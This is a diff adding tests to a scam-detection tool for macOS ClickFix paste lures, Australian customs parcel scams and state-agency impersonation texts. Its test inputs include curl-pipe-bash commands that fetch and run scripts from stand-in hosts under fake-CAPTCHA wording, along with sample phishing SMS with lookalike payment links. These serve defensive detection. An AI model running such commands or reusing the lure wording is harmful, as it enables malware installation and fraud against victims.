@@ -686,6 +686,186 @@ describe("threat-intel roadmap 2026-07-05 (#73-#78)", () => {
     expect(result.flags.some((f) => f.includes("Press Win+R"))).toBe(true);
   });
 
+  // ── ClickFix macOS variant (D3 / #143 / ACSC ASC-2026-0809) ────────────────
+  // Same tactic as Win+R, different keystroke. The hard part is the negative
+  // case: "open Terminal" and `curl | bash` are ordinary developer phrases, so
+  // the rule requires a delivery cue AND a clipboard/fake-CAPTCHA co-signal.
+
+  it("detects the macOS Spotlight paste lure in SMS (D3 / #143)", () => {
+    const result = checkSms(
+      "Verification required: press Cmd+Space, type Terminal, then paste the command below to prove you're human.",
+    );
+    expect(result.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
+    expect(result.score).toBeGreaterThanOrEqual(50);
+  });
+
+  it("detects a curl-pipe-bash command paired with fake-CAPTCHA framing (D3 / #143)", () => {
+    const result = checkCustom(
+      "Confirm you are not a robot — copy this and run it: curl -s https://verify-fix.cyou/f.sh | bash",
+    );
+    expect(result.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
+  });
+
+  it("detects the Terminal paste lure in pasted page content (D3 / #143)", () => {
+    const result = checkCustom(
+      "Browser error detected. To fix it, open Terminal and paste the following command.",
+    );
+    expect(result.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
+  });
+
+  it("does not fire on legitimate CLI install instructions (D3 / #143)", () => {
+    // The whole point of the co-signal requirement. A README says "run this in
+    // Terminal" and stops; it never adds a human-verification framing.
+    //
+    // Asserts the *verdict*, not just the absence of the flag: the terminal
+    // phrasings are also plain requestWords, so a flag-only assertion would pass
+    // while the message still scored its way toward "suspicious".
+    const benign = [
+      "To install the CLI, open Terminal and run: brew install ripgrep",
+      "Install with: curl -fsSL https://get.example.dev/install.sh | sh",
+      "Run in terminal: npm install && npm test",
+      "Paste in terminal to set up the dev environment.",
+    ];
+    for (const text of benign) {
+      const r = checkCustom(text);
+      expect({ text, hit: r.flags.some((f) => f.includes("macOS ClickFix variant")) })
+        .toEqual({ text, hit: false });
+      expect({ text, verdict: r.verdict }).toEqual({ text, verdict: "safe" });
+    }
+  });
+
+  it.each([
+    "Confirm you are not a robot",
+    "I'm not a robot",
+    "Verify you're human",
+    "Prove you are human",
+    "Complete the CAPTCHA",
+    "Human verification required",
+  ])("treats fake-verification phrasing %p as a ClickFix co-signal (D3 / #143)", (framing) => {
+    // Narrowing the clipboard cue made captchaFraming the only co-signal for a
+    // bare `curl | bash`, so it has to cover how the campaigns actually word it —
+    // an earlier revision matched only "i'm not a robot" and silently let
+    // "confirm you are not a robot" through.
+    const r = checkCustom(`${framing}: curl -s https://x.cyou/f.sh | bash`);
+    expect(r.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
+  });
+
+  it("does not fire on 'robot'/'human' outside a verification framing (D3 / #143)", () => {
+    for (const text of [
+      "Our robot vacuum guide: open Terminal and copy the log.",
+      "The human resources team will copy you on the email.",
+    ]) {
+      const r = checkCustom(text);
+      expect({ text, hit: r.flags.some((f) => f.includes("macOS ClickFix variant")) })
+        .toEqual({ text, hit: false });
+      expect({ text, verdict: r.verdict }).toEqual({ text, verdict: "safe" });
+    }
+  });
+
+  it("does not fire on copying output out of Terminal (D3 / #143)", () => {
+    // Regression: bare "copy" as a clipboard cue scored this likely_scam (58).
+    // The attack direction is content moving *into* the shell — copying output
+    // out to a support ticket is the opposite, and is ordinary support advice.
+    const r = checkCustom("Open Terminal and copy the output into this support ticket.");
+    expect(r.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(false);
+    expect(r.verdict).toBe("safe");
+  });
+
+  it("does not fire on 'spotlight' used as an ordinary noun (D3 / #143)", () => {
+    // Regression: bare "spotlight" as a delivery cue scored this likely_scam
+    // (50). This app publishes scam-awareness copy, so it would flag its own
+    // writing.
+    const r = checkCustom("Our new report puts the spotlight on scam trends. Copy the link to share it.");
+    expect(r.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(false);
+    expect(r.verdict).toBe("safe");
+  });
+
+  it("still fires when Spotlight is the launcher (D3 / #143)", () => {
+    // The other half of the narrowed cue — the real lure must still be caught.
+    for (const text of [
+      "Press Spotlight, type Terminal, and paste this to verify you're human.",
+      "Open Spotlight search then paste the command below.",
+    ]) {
+      expect({ text, hit: checkCustom(text).flags.some((f) => f.includes("macOS ClickFix variant")) })
+        .toEqual({ text, hit: true });
+    }
+  });
+
+  it("scores the macOS ClickFix variant once when both variants appear (D3 / #143)", () => {
+    // The Win+R and macOS branches are mutually exclusive, so a cross-platform
+    // lure raises one ClickFix flag, not two for a single instruction.
+    //
+    // The flag count is the assertion that matters: verified by mutation —
+    // flipping the `else if` back to a plain `if` fails this test. A score bound
+    // can't do that job, because both messages already clamp at 100.
+    const both = checkSms("Press Win+R (Windows) or Cmd+Space and open Terminal, then paste this command.");
+    expect(both.flags.filter((f) => f.includes("ClickFix")).length).toBe(1);
+  });
+
+  // ── AU customs / import-duty parcel lures (D2 / #142 / ABF 6 Aug 2026) ─────
+
+  it("detects customs-clearance parcel lures in AU (D2 / #142)", () => {
+    const result = checkSms(
+      "AusPost: your parcel is held at customs. Pay the outstanding import duty to release your parcel: http://auspost-clearance.cyou/pay",
+      undefined,
+      "AU",
+    );
+    expect(result.flags.some((f) => f.toLowerCase().includes("urgency"))).toBe(true);
+    expect(result.verdict).toBe("likely_scam");
+  });
+
+  it.each(["customs fee", "customs charge", "clearance fee", "held by customs", "held at border"])(
+    "flags the AU customs phrase %p (D2 / #142)",
+    (phrase) => {
+      const result = checkSms(`Your delivery is on hold. A ${phrase} is payable.`, undefined, "AU");
+      expect(result.flags.join(" | ").toLowerCase()).toContain("urgency");
+    },
+  );
+
+  // ── AU state-government impersonation (D1 / #141 / ACSC ASC-2026-0807) ─────
+
+  it.each([
+    "VicRoads: your licence will be suspended over an unpaid fine.",
+    "Service NSW: an outstanding fine requires payment today.",
+    "Revenue NSW has issued a penalty notice against your vehicle.",
+    "Transport NSW: your registration is suspended pending payment.",
+    "QLD Transport: unpaid infringement on your account.",
+    "Department of Transport WA: your licence is suspended pending payment.",
+    "VCAT has scheduled a hearing regarding your unpaid debt.",
+  ])("flags AU state government agency impersonation: %s (D1 / #141)", (text) => {
+    const result = checkSms(`${text} Pay now: http://fines-pay.cyou/x`, undefined, "AU");
+    expect(result.flags.some((f) => f.includes("government agency"))).toBe(true);
+  });
+
+  it("does not treat state agency names as no-link senders (D1 / #141)", () => {
+    // noLinkSenders is a strict subset of authorityMentions and the flag copy
+    // names only the federal bodies — VicRoads does use links, so the stronger
+    // "removed links from their SMS" claim must not attach to it.
+    const result = checkSms(
+      "VicRoads: pay your fine at http://vicroads-fines.cyou/pay",
+      undefined,
+      "AU",
+    );
+    expect(result.flags.some((f) => f.includes("removed links"))).toBe(false);
+  });
+
+  it("does not fire state agency names inside ordinary words (D1 / #141)", () => {
+    // "vcat" is 4 chars, so it is substring-matched rather than boundary-matched.
+    // Guard against the class of bug that "acc" ⊂ "account" caused for NZ.
+    const benign = [
+      "The advocate will call you back about the invoice.",
+      "Please allocate the remaining budget this week.",
+      // Regression: "dot wa" was a 6-char substring entry, so it matched a
+      // longhand URL and ordinary prose. Replaced by the full agency name.
+      "See site dot washington dot edu for details.",
+      "The dot was red on the delivery map.",
+    ];
+    for (const text of benign) {
+      const flags = checkSms(text, undefined, "AU").flags.join(" | ");
+      expect({ text, hit: flags.includes("government agency") }).toEqual({ text, hit: false });
+    }
+  });
+
   it("detects device-code / OAuth phishing language in email (D4 / #75)", () => {
     const result = checkEmail(
       "From: security@micros0ft-verify.com\n\nMicrosoft: enter this device code at microsoft.com/devicelogin to verify your new device.",
